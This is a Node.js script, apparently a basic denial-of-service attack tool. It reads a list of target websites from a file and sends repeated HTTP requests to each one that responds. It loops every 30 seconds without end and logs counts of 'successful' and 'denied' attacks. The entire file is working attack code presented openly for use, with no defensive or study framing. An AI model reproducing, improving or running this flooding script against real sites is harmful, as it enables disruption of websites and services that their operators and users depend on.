const SITES_FILE = 'urls.txt'; // file with sites list
const ATTACK_COUNT = 5; // number of attacks per site
const DELAY_BETWEEN_ATTACK = 30000; // ms 60000 = 1min

const request = require('request');
const fs = require('fs');
const readline = require('readline');

const urls = [];
const statistics = {
  success: 0,
  denied: 0,
};

function repeatFunction(url, func, times) {
  if (times <= 0) return;
  func(url);
  repeatFunction(url, func, --times);
}

async function updateUrls() {
  urls.length = 0;
  const fileStream = fs.createReadStream(SITES_FILE);
  const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity,
  });

  for await (const line of rl) {
	if(!line.includes('!') )urls.push(line);
	
  }
}

function attackSite(url, testAttack = false) {
  request(url, bodyRequest.bind({ url, testAttack }));
}

function bodyRequest(err, res, body) {
  const attackStatus = body?.length ? 'Success' : 'Denied';
  const { url, testAttack } = this;
  try {
    if (err) throw err;
    console.log(
      //`Site ${url} has been attacked, attack status: ${attackStatus} code: ${res.statusCode}`
	`${attackStatus} ${testAttack ? 'try ' : ''}attack ${url} code: ${res.statusCode}`    
);
  } catch (e) {
    console.log(
      `${attackStatus} ${testAttack ? 'try ' : ''}attack ${url} error code: ${e.errno}`
      //`Site ${url} has been attacked, attack status: ${attackStatus}, error code: ${e.errno}`
    );
  }
  if (attackStatus === 'Success' && testAttack) {
    repeatFunction(url, attackSite, ATTACK_COUNT);
  }
  attackStatus === 'Success' ? statistics.success++ : statistics.denied++;
}

async function startAttack() {
  console.log(
    `ATTACK STATISTICS: SUCCESS = ${statistics.success}, DENIED = ${statistics.denied}`
  );
  await updateUrls();
	console.log(`length = ${urls.length}`)
	console.log(urls)
  if (urls.length) for await (const url of urls) attackSite(url, true);
  setTimeout(startAttack, DELAY_BETWEEN_ATTACK);
}

startAttack(); // main function

console.log('Attack had been started....');
